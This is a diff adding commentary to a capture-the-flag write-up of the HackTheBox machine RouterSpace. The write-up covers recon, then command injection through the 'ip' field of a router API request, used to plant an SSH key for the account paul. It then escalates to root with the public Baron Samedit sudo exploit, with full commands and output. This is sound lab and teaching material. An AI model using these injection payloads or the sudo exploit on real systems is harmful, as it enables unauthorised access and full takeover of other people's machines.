@@ -5,6 +5,7 @@
 
 ### Vulnerabilities: APK to webpage RCE, Baron Samedit
 
+Nmap tells us that we have a webpage and that ssh is on the machine.
 
 ```console
 └─$ sudo nmap -A -p- -Pn -T4 10.129.227.47
@@ -126,6 +127,9 @@ HOP RTT       ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 123.40 seconds
 ```
+Feroxbuster did not give anything interesting back however I wanted to make a note that it was sending a bunch of infomration back for everything in the wordlist.
+
+This was found by navigating to one of the bogus directories where it says Suspicious activity and then rectified by filtering on those words with -X.
 
 ```console
 └─$ feroxbuster -u http://10.129.227.47 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x php,html,txt,git,pdf -q -X 'Suspicious activity detected'
@@ -150,6 +154,32 @@ Scanning: http://10.129.227.47/fonts
 Scanning: http://10.129.227.47/img/icon
 Scanning: http://10.129.227.47/js/vendor
 ```
+The interesting part is that the webpage has a download for an APK file so lets grab that.
+
+
+
+
+
+
+
+
+I searched the APK for a while looking for anything that popped out. We can find the domain ```routerspace.htb``` but not much else. Also Fuzzing for other domains was not fruitful.
+
+
+
+
+
+
+### For reasons I wont get into I am unable to run the app to get to the next step. So I got some help with this portion.
+
+
+Our Attack Vector was a bit of a hidden one
+
+
+
+
+
+After running the app and capturing the requests in Burpsuite we can perform Remote Code Execution.
 
 ```
 POST /api/v4/monitoring/router/dev/check/deviceAccess HTTP/1.1
@@ -178,6 +208,13 @@ Connection: close
 "uid=1001(paul) gid=1001(paul) groups=1001(paul)\n"
 ```
 
+Since no reverse shells were working likely because of the firewall, we are going to put some SSH keys on the target. I also had some issues with this part but here are my steps.
+
+1. Create Keys on your host
+2. On the victim echo your public key into a file named authorized_keys in the /tmp folder.
+3. On the victim copy the auhtorized_keys file into their .ssh folder.
+4. Chmod 600 the file so it can be used.
+
 ```
 {
   "ip":"$(echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCbFBdKTDZ4PFmZM2B/1pBfhHcSwE1WLpq629DWU9tI84QNb0sHxPjzrPutBWz9L/ahEsDEqCxbfN8QTEvAuTsXQVLfwUqmnocyYIagIukZIlIgmgCoCuL5XPCtX48KZKXnM03vSaerPlxOXwKyael54zRLjn1+05rxv8331ORS7MYOyCPwbZCtdgAq50UQSkRnfsvmcUm8u3bunQK/CcQiXoTGZGzJNy2hWVSgqLkDpSA3zyRA1u5SVGlPX56pQI89a1YmE3m3Cw7mn7+70mTmMPEJaGKvALMGvAmv5H8u8weoP9NaCPNUZciRKQDeh2usgC6LzZ5W/AdfRKsVo4JtcUN/trKiWPfvRxvAPFBmw/9e+eDdM5c/1eXLqeEi4e5O03/FW7F9njhyBVjP0IURm7tHuXvSh3pdS19oVpiHMIppgWd+FZsPow7/5tAltzmPtbPs7LJ1YjrnyG5ossDahZan+XAMRwKhAtcPh8szpoZ0nGaqOGFU+G9El6l5OS8= rogue@rogue' > /tmp/authorized_keys)"
@@ -193,6 +230,11 @@ Connection: close
 	"ip":"$(chmod 600 /home/paul/.ssh/authorized_keys)"
 }
 ```
+
+Be sure to confirm the file is not empty and that it made into the .ssh directory.
+
+If done correctly you will be logged into SSH :)
+
 
 ```console
 └─$ ssh paul@routerspace.htb -i id_rsa
@@ -234,6 +276,12 @@ uid=1001(paul) gid=1001(paul) groups=1001(paul)
 paul@routerspace:~$ 
 ```
 
+The next part took me longer than it should have because everytime I run linpeas the same CVE's pop up on almost all machines so I do not like to try them until all other options havbe been exhausted.
+
+I tried out netfilter since it looked promising with the ip_tables module being on the system which is required for it to run. However that one did not work.
+
+Note: There is an example of how to transfer files with SCP further down. SCP is required since the firewall blocks connections. This is how I got linpeas on the victim.
+
 ```console
 [+] [CVE-2021-22555] Netfilter heap out-of-bounds write
 
@@ -244,12 +292,13 @@ paul@routerspace:~$
    ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
    Comments: ip_tables kernel module must be loaded
 ```
-
 ```console
 paul@routerspace:~/.pm2$ lsmod | grep ip_tables
 ip_tables              32768  9 iptable_filter
 x_tables               40960  10 ip6table_filter,xt_conntrack,iptable_filter,xt_LOG,xt_tcpudp,xt_addrtype,ip6_tables,ipt_REJECT,ip_tables,xt_limit
 ```
+
+I had some luck with baron samedit, after seeing this CVE pop up on other boxes for so long it was kind of nice to be able to use it finally.
 
 ```console
 [+] [CVE-2021-3156] sudo Baron Samedit
@@ -267,9 +316,12 @@ x_tables               40960  10 ip6table_filter,xt_conntrack,iptable_filter,xt_
    Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main
 ```
 
+Pretty simple PE here. I used blasty's CVE and followed the directions.
 
 
 https://github.com/blasty/CVE-2021-3156/
+
+SCP over your entire CVE directory.
 
 ```console
 └─$ scp -r -i ~/.ssh/id_rsa CVE-2021-3156/ paul@routerspace.htb:/tmp 
@@ -278,6 +330,7 @@ hax.c                                                                           
 brute.sh     
 ```
 
+Use the command make.
 
 ```console
 paul@routerspace:/tmp/CVE-2021-3156$ make
@@ -287,6 +340,7 @@ gcc -std=c99 -o sudo-hax-me-a-sandwich hax.c
 gcc -fPIC -shared -o 'libnss_X/P0P_SH3LLZ_ .so.2' lib.c
 ```
 
+Then run the program to identify the target.
 
 ```console
 paul@routerspace:/tmp/CVE-2021-3156$ ./sudo-hax-me-a-sandwich 
@@ -306,6 +360,7 @@ paul@routerspace:/tmp/CVE-2021-3156$ ./sudo-hax-me-a-sandwich
     ./sudo-hax-me-a-sandwich <smash_len_a> <smash_len_b> <null_stomp_len> <lc_all_len>
 ```
 
+Finally run the command again and pick your target to gain root and get the flags!
 
 ```console
 paul@routerspace:/tmp/CVE-2021-3156$ ./sudo-hax-me-a-sandwich 0
@@ -323,3 +378,4 @@ uid=0(root) gid=0(root) groups=0(root),1001(paul)
 300*****************************
 # 
 ```
+GG!
